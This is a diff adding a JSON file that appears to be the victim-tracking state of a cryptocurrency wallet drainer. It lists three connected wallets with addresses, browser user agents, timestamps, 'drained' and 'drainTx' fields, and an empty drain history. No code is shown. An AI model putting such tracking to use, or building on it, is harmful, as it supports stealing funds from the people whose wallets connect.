@@ -1,0 +1,41 @@
+{
+  "connectedWallets": [
+    {
+      "id": 1777648231111,
+      "address": "0x1234",
+      "chainId": 56,
+      "userAgent": "",
+      "connectedAt": "2026-05-01T15:10:31.120Z",
+      "lastSeen": "2026-05-01T15:10:31.472Z",
+      "online": true,
+      "drained": false,
+      "drainTx": null,
+      "tokens": []
+    },
+    {
+      "id": 1776838830512,
+      "address": "0x4c2aF17E7c8dA2a793FdfB0be68D04Cf03411d86",
+      "chainId": 1337,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
+      "connectedAt": "2026-04-22T06:20:30.512Z",
+      "lastSeen": "2026-04-22T06:20:30.512Z",
+      "online": true,
+      "drained": false,
+      "drainTx": null,
+      "tokens": []
+    },
+    {
+      "id": 1776826715793,
+      "address": "0x71c66dB13eeD005e23Df2a12F00926B677E3B078",
+      "chainId": 56,
+      "userAgent": "",
+      "connectedAt": "2026-04-22T02:58:35.793Z",
+      "lastSeen": "2026-04-22T02:58:35.793Z",
+      "online": true,
+      "drained": false,
+      "drainTx": null,
+      "tokens": []
+    }
+  ],
+  "drainHistory": []
+}
